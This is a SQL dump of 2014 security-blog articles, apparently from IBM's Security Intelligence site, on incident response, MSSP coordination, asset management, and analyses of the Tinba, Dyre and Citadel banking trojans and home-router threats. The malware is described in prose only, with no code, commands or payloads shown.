talk: In reality, security is about people, process and technology. What we’ve been doing is keeping people out of the loop as much as possible because they are considered a liability. We’ve been doing pretty well with respect to having automatic and semiautomatic systems when it comes to prevention and detection. With incident response, what is changing is the ratio of the importance and involvement of these three factors. The problem with response is that you can’t take people entirely out of the loop, and the ratio of people to technology goes up when it comes to response. This is primarily due to differences in environments, regulations, attacks, economical and political situations, etc., which vary from organization to organization. These differences are more important than the technical considerations. Moreover, the economics discussed earlier are very different when they concern response as opposed to protection and detection, where there is less of an effect on the network. This is still going to be important because organizations will usually go after big names. There will also be a much higher marginal cost, lower switching costs, less of a lemon market as requirements are functional, less of a first-mover advantage and far fewer national monopolies. So, unlike the area of prevention and detection, better companies, products and services will do better, which is a good thing. The key here is making a response scale that doesn’t remove people, but rather builds technology to help support people when they complete their critical tasks. The goal is to build resilient systems; we cannot build impenetrable systems, yet they should not be fragile, either. Since response happens in real time, Schneier then switched over and explained an applicable system theory from the Air Force. The decision cycle to observe, orient, decide and act is called the OODA loop and is widely applicable in any real-time adversarial situation. The key here is speed: If you can make your OODA loop faster than an adversary’s or get inside the adversary’s OODA loop, your response is faster than the adversary’s reaction to your response. Let’s talk about what OODA means for response. Observing is knowing all that is happening in your network in real time and getting all the data in a place where it can be monitored in real time. Orienting is understanding what this information means in context — what is happening in the company, what is happening in the greater community, new malware, new  , what geopolitical situations are happening or what is happening within your organization, such as the release of new software, a merger, layoffs, etc. Deciding is landing on which action to take, what sort of input is required from different stakeholders (lawyers, executives, public relations, etc.), having the authority to make changes quickly and deciding who will have this authority, who can grant this authority and which process there should be to get it. Acting is implementing all of these decisions. We need powerful, flexible and intuitive tools to take care of the whole ecosystem and help people perform a proper response. The neat thing about this is that the requirements here are functional, as opposed to the nonfunctional ones in prevention and detection. So, the good will beat out the mediocre. We need to build good things and bring people and technology together to mirror less of IT and more of generic risk management. We can learn a lot from other domains that have been doing this for decades.', '\'Black Hat\', \'Cloud\', \'Cloud Security\', \'Cybersecurity\', \'Human Psychology\', \'Incident Response (IR)\', \'Information Technology (IT)\'', 'https://securityintelligence.com/a-look-back-at-the-state-of-incident-response-by-bruce-schneier/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (506, 'How Should an Organization and MSSP Coordinate Incident Response?', 'Michael Sanders', '2014-9-23', 'The scope of   roles and responsibilities in the area of threat response is often misinterpreted in terms of the process and ownership. One of the most important elements of a successful security partnership relates to how an organization and the MSSP coordinate event and incident response activities. It is important to note that while the MSSP should be able to provide information and guidance regarding impact analysis and responding to threats, it is typically the organization’s responsibility to own the final determination of potential impact and the threat response actions needed. Organizations are advised to clearly understand the who and how of handling client-side activities for impact analysis and threat response. A typical MSSP will use its monitoring and automated intelligence capabilities to identify potentially serious security events. If such an event is discovered, the MSSP will escalate it to the organization’s security contacts along with countermeasure recommendations. The security analysts are typically responsible for the initial review of an escalated event to confirm whether it poses a threat. If warranted, the security analyst invokes the appropriate threat response process according to internal policies. Threat response generally includes active collaboration between an MSSP and the organization security analysts for impact analysis and investigation. A remediation plan, if needed, must be created with the appropriate actions being communicated to their owners. If device policy changes are needed, analysts should be prepared to work with the MSSP to have the changes defined, approved and implemented. If appropriate, your computer security incident response plan (CSIRP) would be evoked. If needed to supplement your capability for researching and responding to security incident tickets, some MSSPs provide optional named security intelligence analyst (SIA) resources. Often, this type of resource can be considered an “add-on” element of the scope of contract. SIA resources can also help provide custom threat analysis and handle threat intelligence and event analysis. Most organizations will want to evaluate their needs in their area based on internal staff/skills and availability of security analysis bandwidth. The lack of a unified incident management process, coupled with inexperienced staff, can increase the business impact of security incidents. If you have strong security analysis skills and are able to engage the MSSP-provided analysis tools, a named MSSP resource in this area may not be necessary. However, if you are short on necessary security analysis staff or skills, you may benefit from having a named resource focused on   for your organization. \n An organization’s incident response plan is the foundation for all  . You own the plan; the MSSP does not. Consequently, regular gap assessments and benchmarking exercises are needed to help ensure the soundness of your organization’s incident response program. Cyberstress testing through scenario-based exercises is especially useful. It can help organizations understand the consequences of various events and actions and how to be better prepared to address such circumstances. Stress testing also validates incident response processes and overall plan execution and assesses an organization’s readiness to respond to a serious security incident. Your organization’s CSIRP should specify how incidents should be handled. The incident-handling checklist, published by the  , outlines which activities should be covered in the CSIRP. NIST has proposed a straightforward forensic process model that consists of four steps: collection, examination, analysis and reporting. This model describes a general process for extracting data from various media and performing analysis to draw the essential information that can serve as evidence from the data. It is important to note that there are several models that have been designed to define the forensic process. While most models are similar in terms of basic principles, organizations should adopt the model that most closely aligns with their operational and business needs. It is advisable to consider third-party services to review, design and/or test your CSIRP. Ask your MSSP which consulting services it can offer in these areas. Your security operations programs depend on effective threat response preparation and the ability to execute threat response. Although the MSSP is a contributor in your threat response capabilities, organizations must be aware that many elements of a threat response plan lie beyond the MSSP scope, with much of it driven by clients. As a cornerstone of your defense against malicious hackers, malware, human error and a host of other threats, a CSIRP is the map that guides your response to a successful attack. It should define the roles and responsibilities of all respondents, establish authority for making major decisions and define communication flows and notification procedures. Without a CSIRP, your incident response team can waste invaluable time and resources figuring out what to do, leading to potentially higher costs and greater damage to your organization and your reputation.', '\'Incident Response (IR)\', \'Managed Security Services Provider (MSSP)\', \'National Institute of Standards and Technology (NIST)\', \'Threat Response\'', 'https://securityintelligence.com/how-should-an-organization-and-mssp-coordinate-an-incident-response/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (507, 'How to Improve Asset Management for Risk Assessment and Control', 'Peter Allor', '2014-9-23', 'Asset management is a topic of conversation for many industry professionals due to several factors, including continuous diagnostics and mitigation, the   and other conversations around breaches and vulnerability threats. Most organizations focus on one of two areas: hardware or software. Most people have participated in a hardware asset inventory by reporting which desktop or laptop they have, its serial number and where it is physically located. That is only the surface of that inventory process, however, and most times, it is not done very well or thoroughly. Software asset inventories are usually only done to true up license management practices. For  , you need a much more in-depth set of inventories, as illustrated by the  . While conducting both the hardware and software asset inventories, both from an active, on-the-network aspect and the passive, what-is-installed-on-the-asset-itself aspect, we need to know the OS, the application and patch levels, the configurations and what the state of known vulnerabilities are to develop a truer picture of the threat and the risk picture we are willing to take on. Here is where the   has more meaning. Although patch rates for OpenSSL have increased, do you know every place in your network that uses OpenSSL? Do you have a risk assessment of the danger? Do you have compensating controls, either technical or operational, to limit or mitigate the dangers?  Management (not security management or information technology management) should be given the ability to know and assess risk and to assign means (resources and priorities) to mitigate that risk for the business and operations. The challenge in the Heartbleed example is in the number of vendors and internal, home-built systems that are incorporating third-party software. This is where the combination of asset inventories (hardware, software, configuration management and vulnerability management) set the baseline in any security risk management framework. The key is an established, frequently updated inventory that is pre-existent and quickly actionable for verification within several hours. It should be pre-existent so you know your assets and quickly actionable so you can verify certain parameters and risk strategies are in place. A good asset management strategy has the following elements: While we will never have the luxury of a completely secure environment from all manners of attack methodologies, we can gain a measure of success in dealing with the ever-changing flow of vulnerabilities and attacks we face. The assurance is in having the means and tools to do so quickly, have sure answers to the state of our domain and to flex for the   in the future.', '\'Asset Management\', \'Heartbleed\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'National Institute of Standards and Technology (NIST)\', \'OpenSSL\', \'Risk Assessment\', \'Risk Management\', \'Vulnerabilities\'', 'https://securityintelligence.com/how-to-improve-asset-management-for-risk-assessment-and-control/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (508, 'Tinba Malware Reloaded and Attacking Banks Around the World', 'Assaf Regev', '2014-9-22', 'IBM Security Trusteer researchers, in addition to those from Avast, recently identified a new variant of the  , which had its source code leaked in July. The variant is exhibiting some interesting new features, including techniques to bypass automated security controls and the ability to “phone home,” even if the original command-and-control (C&C) center has been taken down. Initially, only a handful of financial institutions were targeted. However, at the time of this posting, this attack had broadened to include a larger number of banks globally — including the United States and Canada. Our research teams have been tracking and flagging these files as malicious with a combination of low (2/55) and high (22/53) detection rates in VirusTotal (VT) in addition to samples that have yet to be submitted to VT. According to an analysis conducted by IBM Trusteer researchers, the malware seems to have been assembled from the leaked source code of the well-known Tinba malware, one of the most sophisticated financial malware toolkits available today. Since the leak of Tinba’s source code in July, new functionality has appeared, improving malware stealth, recovery mechanisms against takedown attempts and new behavioral changes. Tinba’s new behavioral changes include: After the dropper is executed, it generates a folder name using a hard-coded key XORed with the machine’s volume-serial number. The resulting hexadecimal string is used both in the malwares’ folder and mutex names. (The malware executable file name is hard-coded and hasn’t changed since the original Tinba). Following that, the malware installs hooks on functions such as NtResumeThread, NtCreateUserProcess and NtCreateThread, which allow it to stealthily propagate in the system. Furthermore, it hooks NtQueryDirectoryFile and NtEnumerateValueKey in order to hide its folder and run key from advanced users. Tinba is joining Gameover Zeus in an attempt to improve communication capabilities with the C&C by having a fallback in the form of a DGA. Initially, it attempts to communicate with a hard-coded C&C server, and in case of failure, it starts using one of its fallback-generated domains. An additional feature of the new strain is the usage of the crypt32 Windows library in order to authenticate the server against a challenge response. The infected machine sends a request comprising several time stamp counters (counting the number of CPU cycles since reset) concatenated together. This technique ensures a unique challenge is sent every time, so intercepting one challenge does not suffice to impersonate as the C&C server. This message is encrypted with RC4 (like all of Tinba’s communication) and then sent to the server. A hash of the message is created using SHA-1. The hash is then encrypted with a private key on the server’s side and returned as part of the response. The response itself is authenticated by the malware using the Windows API CryptVerifySignatureA with a hard-coded public key. It is important to note that without proper authentication, the communication routine will not continue, and the authentication process will repeat forever. Following a successful authentication, the communication routine repeats itself several times and then attempts to authenticate again. This is done in gradually expanding intervals. As opposed to previous Tinba strains, the new one comes with a preloaded configuration. If the browser is launched while the malware was unable to download a configuration, the preloaded, hard-coded one will be used instead. In addition, on top of the RC4 decryption layer used in previous strains, the new strain adds a pre-step of XOR with the volume serial and a post-step of decompression using aPLib. In some recent configurations, we’ve discovered an interesting gem: the use of an ATSEngine panel, similar to the latest versions of Zeus, such as Citadel and ZeusVM. Tinba configuration contains webinjects of external malicious Javascript code, as seen below: This malicious code is capable of applying dynamic webinjects in a large number of online banking websites. It adjusts the webinject to the exact look and feel of the original website. These dynamic webinjects are part of the ATSEngine infrastructure that enables the attacker to collect multiple data elements, such as the victims’ credit card type (credit, debit), CVV, PIN and SSN. The fraudster can then use a man-in-the-browser attack to transfer the available balance to a third party (a money mule), who withdraws the funds and sends them to the attacker in an untraceable way. Since the Tinba source code leak in July, Tinba has been spotted in various locations   with new features and functionality. This serves as a reminder that cybercriminals are fully aware of reverse engineers and researchers analyzing their products; they are constantly developing new tactics and methods while attempting to stay under the radar and bypass automated and human security controls. IBM Security Trusteer researchers and threat analysts are closely monitoring this variant while providing appropriate protection against this new threat, using either   or   to provide protection against this type of   and many others. These solutions can detect, mitigate and remediate infections to protect the enterprise and your customers.', '\'Citadel Malware\', \'Command-and-Control (C&C)\', \'Cybercriminals\', \'Federal Bureau of Investigation (FBI)\', \'Financial Malware\', \'Gameover Zeus (GOZ)\', \'IBM\', \'Malware\', \'Tinba\', \'Trusteer\', \'Zeus\'', 'https://securityintelligence.com/tinba-malware-reloaded-and-attacking-banks-around-the-world/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (509, 'Dyre Banking Trojan Used in APT-Style Attacks Against Enterprises', 'Dana Tamir', '2014-9-15', 'The global cloud computing company Salesforce.com is   its customers that the Dyre Trojan might be used to target their login credentials. The Dyre banking Trojan, which typically targets customers of large financial institutions, was recently used in a large-scale, credential-phishing campaign targeting Bank of America, Citigroup, Royal Bank of Scotland and   customers. According to Saleforce.com, there is no evidence that the attack was successful, nor that any of its customers have been impacted. The use of the Dyre Trojan to target enterprise customers of Salesforce.com is part of an emerging trend that has been rapidly growing over the last few years. So-called “banking Trojans” are no longer used only for targeting customers of large financial organizations — they are now increasingly used for targeting enterprises. Trusteer, an IBM company, recently reported about another known banking Trojan, Citadel, which was used to  . The Citadel Trojan was instructed to wait until the user accesses any of the Internet-facing systems of the targeted organizations, such as Web mail, and grab all the information submitted by the user. This information would most likely include the user’s credentials, which would provide the attack with access to these systems. In the past, banking Trojans like Zeus, Citadel, Shylock and now the   were specifically designed to steal banking credentials and enable cybercriminals to commit financial fraud. They mainly used techniques like man-in-the-browser (MitB), or keylogging, to grab the user’s financial and personal information and enable fraudulent activities. Over the years, malware developers significantly extended the functionality of these Trojan families, creating new variants and extending their targets. Today these Trojans offer a wide range of powerful functions that allow cybercriminals to steal information from infected computers, gain access to networks to which these machines are connected and even gain full control over these machines. The development of sophisticated new capabilities turns these Trojans into powerful advanced persistent threat (APT) tools. They are no longer focused solely on stealing personal and financial data from victims: These Trojans are now being used to target various organizations in search of sensitive business data, access to organizational systems and even access to operational systems. \n Banking Trojans offer another advantage: They are massively distributed. The use of massively distributed malware means that attackers don’t need to spear-phish targets or design custom malware. Instead, they use mass-distribution techniques to infect as many PCs as possible. These malware distribution campaigns can use malicious email attachments, drive-by downloads, watering hole attacks and social-engineering schemes to infect millions of PC around the world. The use of massively distributed malware allows cybercriminals to take advantage of millions of machines already infected with the Trojans. In order to point these Trojans at new targets — in this case, enterprise organizations — the cybercriminal only needs to provide these Trojans with a new configuration file. The configuration file received from a command-and-control (C&C) server contains information about the targets as well as other operational details. The configuration file can also contain information about a new C&C the Trojan should start working with. This enables cybercriminals to repurpose existing Trojans on user machines as needed. IBM Trusteer research found that, on average,  . Trusteer’s Security Services team reports that they discover massively distributed APT malware in every customer environment they work with. This means that any organization can become a target of these attacks. It is no longer a question of “if” machines will become infected; you must consider the possibility that some of the machines in your organization may already be infected. How will an infected user machine affect your organization? IBM Trusteer Endpoint Protection solutions,   and   provide extensive protection against massively distributed APT malware families, including Dyre, Citadel, Zeus, SpyEye, Shylock and more. These solutions detect, mitigate and remediate massively distributed APT malware infections. Moreover, the IBM Trusteer Apex and Rapport solutions stop future infections and prevent endpoint compromise by applying integrated, multilayered defenses that break the threat life cycle. IBM Trusteer threat research is based on dynamic intelligence feeds from more than 100 million protected endpoints and translated into security updates that are automatically sent to protected endpoints. Deployments of IBM Trusteer Endpoint Protection solutions are backed by Trusteer’s security services, which help enterprise organizations deal with massively distributed APT attacks and emerging threats.', '\'Advanced Persistent Threat (APT)\', \'Banking\', \'Banking Trojan\', \'Citadel Malware\', \'Dyre\', \'Keylogging\', \'Malware\', \'Man-in-the-Browser (MitB)\', \'Shylock\', \'Trojan\', \'Trusteer\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/dyre-banking-trojan-used-in-apt-style-attacks-against-enterprises/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (510, 'Massively Distributed Citadel Malware Targets Middle Eastern Petrochemical Organizations', 'Dana Tamir', '2014-9-15', 'Recently, IBM Trusteer researchers identified targeted cyber attacks on several Middle Eastern petrochemical companies. They have identified a campaign in which attackers are using a variant of the evasive  . Citadel was originally created for the purpose of stealing money from banks and has been massively distributed on users’ PCs around the world. While the use of advanced malware that was originally built for financial theft as a generic   tool is not new, this is the first time we’ve seen Citadel used to target nonfinancial organizations in a targeted/APT-style attack in order to potentially access corporate data, steal intellectual property or gain access to secured corporate resources, such as mail systems or remote access sites. The targets of this attack include one of the largest sellers of petrochemical products in the Middle East and a regional supplier of raw petrochemical materials. We have worked to responsibly disclose this information to appropriate parties. \n The Citadel malware was first discovered in 2012. Back then, it was a man-in-the-browser malware designed to steal banking credentials using webinjects. Since then, malware developers have significantly extended its functionality. Today, it offers a wide range of powerful functions to steal information and remotely manage infected computers. The malware operates according to instructions provided in a configuration file. Once Citadel is installed on a machine, it fetches a configuration file from one of its command-and-control servers. The configuration file instructs Citadel on which websites and applications to target, which information to steal and how to steal it. According to an analysis of the configuration file used in this attack, the Citadel malware was instructed to look for user access to certain URL addresses of Internet-connected systems, such as webmail, of the targeted companies. Once the browser accesses such a URL, the malware is instructed to grab all the information submitted by the user. This is known as form grabbing, or “HTTP POST” grabbing. When the user submits information into the system, the Web browser generates an HTTP POST request that sends the data entered to the site. The malware then intercepts the POST data before it is encrypted and sent to the server. Below is the relevant section from the configuration file (shown in a Trusteer proprietary format), with the names of the targeted companies redacted: To steal login credentials that provide access to the company’s webmail system, the malware looks for URLs like “http://mail. .com,” which would be the login URL of the webmail system. When the user submits the login credentials, the malware grabs the username, password and any other information that is submitted during the login process. The information is sent to the cyber criminal, who can then log in on behalf of a trusted user, access corporate emails, send malicious emails and more. This is not the first time massively distributed malware originally designed for financial fraud has been used to target nonfinancial organizations in an APT-style attack. In fact, we wrote an   on this back in 2010. Citadel is one of many dozens of malware families that were initially created to steal money from financial targets, such as banks. These include the infamous  , SpyEye and Shylock families. Over time, malware developers extended the capabilities of these malware families and added advanced evasion techniques to turn them into sophisticated APT tools that can target organizations in general. The typical functions available with these malware families include: Although the trend of using such malware for APT-style attacks has been seen for a few years now, many are still not aware of it. APTs are still referred to as highly targeted attacks that utilize custom tools specifically designed to target an organization or a group of organizations. The use of   means that attackers don’t need to spear-phish targets or design custom malware. Instead, they use mass distribution techniques to infect as many PCs as possible. These malware distribution campaigns can use malicious email attachments, drive-by downloads, watering hole attacks and social engineering schemes to infect millions of PCs around the world. IBM Trusteer research found that an average of 1 in 500 machines worldwide is infected with massively distributed APT malware at any point in time. IBM Trusteer’s Service team reports that they have discovered such malware in practically every customer environment in which they’ve worked. The graphs below, based on IBM Trusteer research, show a heat map of massively distributed APT malware infection rates per country: IBM Trusteer Endpoint Protection   are designed to provide extensive protection against massively distributed APT malware families, including Citadel, Zeus, SpyEye and Shylock. These solutions can detect, mitigate and remediate massively distributed APT malware infections. Moreover, they can stop future infections and prevent endpoint compromise by applying integrated, multilayered defenses that break the threat life cycle. Deploying a solution can help enterprise organizations deal with massively distributed APT attacks and emerging threats. IBM Trusteer threat research is based on dynamic intelligence feeding from more than 100 million protected endpoints and translated into security updates that are automatically sent to protected endpoints. Deployments of IBM Trusteer Endpoint Protection solutions are backed by Trusteer’s security services, which can help enterprise organizations deal with massively distributed APT attacks and emerging threats.', '\'Advanced Malware\', \'Citadel Malware\', \'Endpoint\', \'Endpoint Protection\', \'HTML Injection\', \'Keylogger\', \'Keylogging\', \'Malware\', \'Middle East\', \'Shylock\', \'SpyEye\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/massively-distributed-citadel-malware-targets-middle-eastern-petrochemical-organizations/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (511, 'Who’s Worried About Home Network Security?', 'Doug Franklin', '2014-9-8', 'Every enterprise with teleworkers should be worried about home network security, as evidenced by the recent   conference. In a breakout session, Jonathan Spring and Paul Vixie presented a briefing titled “ .” Here, the term refers to network equipment installed in home and small-business environments. The briefing focused on cable and DSL modems but also included home routers, Wi-Fi access points and devices with specific, limited functionality. This presentation comes at an opportune moment, as our industry has seen increasingly more public disclosures of vulnerabilities in CPE devices and more campaigns to exploit them. Our industry often focuses on the needs of large institutions and network operations, while those “little plastic boxes” (LPBs), in the words of Vixie, receive comparatively little attention. That needs to change. Like it or not, those LPBs are a part of your enterprise network. They arrived as an underappreciated aspect of teleworking. For instance, LPBs are often the first and last stops for the Internet traffic of your remote employees; they often mediate your communication with your customers because they’re working from home, too. Compromised LPBs can provide access to the communication channel that is second only to   installed directly on the hosts. Their position in the communication channel gives them the capacity to execute Man-in-the-Middle (MitM) attacks on secure communications. They also provide a collection of resources that adversaries can use to execute or amplify distributed attacks. As long as they work, few LPB owners pay much attention to them, allowing a well-executed attack to essentially go unnoticed forever. Each LPB has few resources, but the Internet contains millions of them. Considered in aggregate, they present an intimidating capability. The scope of the problem is such that Spring and Vixie refer to it as a public health hazard for the Internet. This is not a theoretical discussion. The   are real, as are the exploitation campaigns. Those of you who follow the InfoSec news will recognize the following examples: Perhaps the best-known CPE exploitation campaign was reported in 2012 — by the perpetrator. Apparently, no one publicly noted the campaign while it was progressing. The perpetrator published a   describing the campaign, in which the botnet employed over 420,000 individual infections. In the report, the author remarked that a large percentage of the unsecured devices bore the hallmarks of broadband modems, network routers and other devices with embedded operating systems that typically aren’t intended to be exposed to the outside world. It is important to note that the report indicates the campaign tools could tell that other unauthorized software was also running in thousands of devices. Specifically, the campaign tools detected a distributed denial-of-service (DDoS) application known as   on about 30,000 of the devices compromised by the campaign. Further, the report claims that the campaign infected about 100,000 hosts in the first 24 hours of the operation. Consider the resources that 100,000 hosts could bring to bear against your network. Even as LPBs on DSL and cable lines, 100,000 of them represents a noticeable threat, just from DDoS concerns. This unlikely threat surfaced in February 2014 when a bizarre attack infected Linksys routers with self-replicating malware in a worm attack called  . This malware infects a variety of consumer-grade Linksys routers and exploits a vulnerability that allows it to slip shell commands through the HTTP interface to take over the router. The malware targets certain Linksys models that are commonly deployed in small-office/home-office environments. This campaign presents two obvious peculiarities. First, according to available reports, it doesn’t do anything particularly nefarious. It spreads and infects new hosts, but that’s about it. Once it controls a device, it often changes nothing. The modifications it does make tend to be benign, such as pointing the device’s domain name system resolver to Google’s public name resolvers. Further, this campaign exhibits “peculiar specificity” in the subnets that it scans for infectible hosts. The executable holds a hard-coded list of dozens of subnets that it will scan. The list appears to focus on last-mile Internet service providers (ISPs), such as Cox, Comcast, Time Warner Cable, Shaw and RCN. Thus, it seems to seek the subnets most likely to host quantities of consumer-grade CPE. Technically, that’s not peculiar — it’s just smart. Considering those points, this incident looks like testing or validation of some experimental threat. Perhaps it’s a proof of concept to accumulate sensor data and calibrate further development. Luckily, a mistake in the malware made it noticeable to an ISP, and there was a chance to review and analyze it. In 2011, the FBI published “ ,” describing an advertising fraud malware campaign called Operation GHOST CLICK. The malware infected LPBs and changed their DNS settings to redirect Web requests to malicious servers. Controlling the device, the attack affects all users “behind” that LPB. The malicious servers used the requests to execute advertising click fraud for revenue. Luckily, the malware appears only to have used the DNS redirection technique for click fraud. They could have done much worse, as the next example shows. Finally,   reported a large-scale redirection attack on home routers for financial theft. Researchers noticed this campaign due to e-banking site modifications observed on iPhones. This attack also involved changing the LPB’s DNS settings. The altered settings sent users to malicious servers that monitored the traffic to identify e-banking transactions; they then rewrote the transactions to steal the users’ credentials. The malicious servers terminated the TLS/SSL connection before it reached the user. Adversaries then had access to the plain text traffic and could rewrite nearly anything in the transaction. For example, the attack modifies traffic to display false URL information in the browser. If the “hoax” succeeds, after the user enters his or her credentials into the hoax website, the attackers have access to them. If the current situation provides any guide, the   (IoT) will likely worsen the situation because most vendors and device owners don’t have their eye on the ball. LPBs are already everywhere, so imagine how many more vulnerable devices are waiting in the wings as the IoT starts to take off — this isn’t even to mention smartphones. Cost constraints present one problem. Limiting unit costs, many of these devices have few computing resources. For instance, many simply cannot reasonably provide secure communications. This issue applies more to the IoT than CPE equipment, though. On the CPE side, the devices tend to have somewhat more capable hardware, but costs limit the firmware capability. A second problem relates to the variety of devices available with Internet capability these days. Consider home security and automation systems controllable with a smartphone or over the Internet. They suffer from many of the same issues as the LPBs. Even if you use good passwords, did your vendor intentionally include a back door? Is your vendor diligent about finding and fixing vulnerabilities, notifying customers and distributing the fixes? At Black Hat USA 2014, Jesus Molina described some of these possibilities in a presentation titled “Learn How to Control Every Room at a Luxury Hotel Remotely: The Dangers of Insecure Home Automation Deployment.” The talk’s essential message was that vulnerabilities in automation systems deployed by a luxury hotel allowed for the impersonation of other rooms and guests. Private labeling means the same vulnerability can affect large numbers of models, even from different manufacturers. Inside the LPB, they are all the same device with the same “firmware” (except for the logos, company names, etc.). Looking to the positive, though, that means one set of infrastructure updates could take care of all of them. Beyond the attacks discussed above, adversaries can use the open DNS resolvers in many of these devices to originate or amplify DNS-based DDoS attacks. The LPB must only originate a 60-byte DNS query. Using EDNS0, however, the responses are hundreds or thousands of bytes each. The LPBs don’t run that fast, but hundreds or thousands of them can still produce large volumes of traffic. The LPBs could also participate in spam origination. They have few resources, but they are often enough to compose and send messages (slowly), usually through some third-party open Simple Mail Transfer Protocol relay. Having stolen the user’s credentials, it could even send these messages through the user’s email account. MitM attacks probably present the greatest threat, though. The Polish e-banking attack illustrates this threat quite well. The position of the LPB in the connection allowed the adversaries to inject malware into the session and eliminate the Secure Sockets Layer/Transport Layer Security protection, enabling user credential theft. This threat highlights the enterprise InfoSec risk. LPB malware can steal banking credentials and may be able to steal your teleworkers’ corporate network credentials. Using VPNs and other forms of encrypted sessions can close this vector, but the LPB gets the first crack at the traffic. This gives the adversary a wide latitude in attack techniques. We all know that software will always have bugs and vulnerabilities. The firmware in the LPBs suffers as surely as any other software. However, LPBs have the following two additional burdens: Most LPBs are managed by people with little to no training who have less time to learn how to keep their systems safe and secure: homeowners. Most homeowners turn the device on, configure it based on the quick-start guide and ignore it until it stops working. Then, the homeowner turns it off and back on. If traffic flows, all is well; if not, homeowners may wrestle with the ISP and vendor customer support. Eventually, if all else fails, they buy another device. Many people managing LPBs know only what the device manual says about things such as IP addresses, subnet masks and MAC addresses. If traffic moves, they have no way to tell whether things have gone wrong if they look at the configuration settings. They remain blissfully unaware of InfoSec best practices and are completely in the dark as to the ramifications of some of the configuration settings offered by the devices. They have lives, and they like it that way. Even assuming there are capable operators managing the LPBs, manufacturers often leave the operator holding the bag. Many older devices offer no way to update their firmware. Even for newer devices that could accept updates, vendors (ISPs) often lock the device, preventing the homeowner from even trying to manage it. Vendors that do produce updates often offer only fully manual update methods. The methods and their instructions tend to be terribly scary to busy parents trying to keep the Internet working so their kids can finish their homework. However, even vendors offering manual update functions may never produce any updates; they usually stop producing updates long before the last one goes to that great recycling center in the sky. Even if they produced an update, the announcement rarely reaches a harried homeowner. Sometimes, the bag is empty — or hidden. Finally, even the updates vendors provide can be very suspect. According to  , a study found firmware to be plagued by poor encryption and back doors. In one case, a firmware update in the past year contained a 10-year-old Linux kernel. Adding insult to injury, according to  , a vendor produced a firmware update after public furor about an open back door in the firmware. However, the update did not eliminate the back door; instead, the vendor tried to leave the back door there but hid it. That is not acting in good faith. Now that we’ve looked at the risks and breakdowns, what can we do to improve the situation? It seems obvious that liability will end up playing a role in the solutions. It could be regulatory, civil or criminal liability, or liability to a body, such as Underwriter’s Labs or the Computer and Communications Industry Association. It could also simply be liability in the court of public opinion, though current structures haven’t had the effects we would have liked. Obviously, though, society needs to incentivize the vendors to do better, and disincentivize them from leaving security issues hanging. First, the industry must clean up some fundamental failings. The vendors must ensure device configurations default to “as secure as possible” settings, such as disabling remote device configuration by default. Most modern devices already do a decent job at this. Vendors must also work harder to make secure configuration of the devices easier for mom-and-pop operators to manage. Vendors must completely eliminate all back doors and all default administrative accounts and passwords that cannot be changed or removed from the devices. As noted above, some vendors think that back doors are such a good idea that they’ll try to hide them rather than removing them when caught. The industry and vendors must attain an awareness of the security implications of their products and their product development methods. We must find ways to narrow the adversaries’ window of opportunity to exploit vulnerabilities that end up in products. An easy — and expensive — choice would be limited lifetime products that simply refuse to continue working after a period. Spring and Vixie mentioned this option in their briefing. Dan Geer also mentioned it in his keynote speech, “ .” This seems destined to produce customer discontent when discussing things the homeowner typically purchases directly, such as cable or DSL routers; it might work more smoothly for equipment owned by ISPs, such as cable and DSL modems. However, this looks like vendors are accosting their users due to their inability to produce secure products. That said, if the price of those devices drops enough, the fallout might be negligible. On the other side, creating automatically-updating products leaves vendors with a pile of expenses they don’t currently suffer. This obviously pushes up prices, which neither vendors nor customers will love. The following are among the extra expenses for the vendors: These expenses could potentially drive smaller operations out of the business completely if pushed fully onto their shoulders. However, they could also offer an opportunity for a company or industry body to provide the distribution infrastructure necessary if some agency comes along that requires automatic updates. The security of our digital information requires that we narrow the attackers’ window of opportunity. Either these devices must leave service often enough, or they must receive continuous, automatic updates, like Microsoft’s Windows, Apple’s Mac OS and Adobe’s Flash and Reader — and for the same reasons. Spring and Vixie also recommended that all LPBs enforce source address validation. In other words, they pass traffic only for specific devices, similar to how Bluetooth devices must be “paired” before they will operate together. Many LPBs already have the capability to allow only specific MAC addresses, but the configuration of those options needs to be much more straightforward. Finally, they recommend what might be called “forced open sourcing” for products abandoned by a vendor. This approach holds potential value but opens more than one can of worms. For example, the legal definition of “product abandonment” might require modifications to balance owner security with the intellectual property rights of the vendor. Further, open sourcing the firmware entails more than many would suspect. Obviously, to be able to find and fix vulnerabilities, the raw source code of the firmware must be available. By itself, that can present legal challenges involving the vendor’s intellectual property and often other vendors’ intellectual property, as well. The problem gets sticky before that, though: Having the raw source code only helps those who also have access to the necessary build infrastructure. In order to produce an update, one must possess the firmware source code and the entire tool chain necessary to compile, link, locate and package the update. In most cases, this process usually drags in the legal departments of several more vendors. Home network security presents challenges that are as important as those found in enterprises. Weak home network security can affect the owners and operators of all the devices in the home network. It can also compromise many measures aimed at protecting the enterprise network by allowing the adversary to gain unwarranted privileges in the home network and its hosts. The problems presented by CPE can be every bit as challenging as those presented by malware targeting desktops and servers. Correcting the situation of vulnerabilities and firmware updates will take time to fund, implement and deliver, so you must begin taking steps as soon as possible to get the effort off the ground. The Black Hat USA 2014 conference offered several other briefings and round-table discussions on related topics. Unfortunately, the Black Hat website does not provide copies of the papers or presentations. They may be included in the videos that the BlackHat organizers sell. The Black Hat site does offer the briefing   and a   for “Smart Nest Thermostat: A Smart Spy in Your Home,” by Yier Jin, Grant Hernandez and Daniel Buentello. Finally, here are a few papers from venues other than Black Hat:', '\'Black Hat\', \'Home Network\', \'Home Network Security\'', 'https://securityintelligence.com/whos-worried-about-home-network-security/');
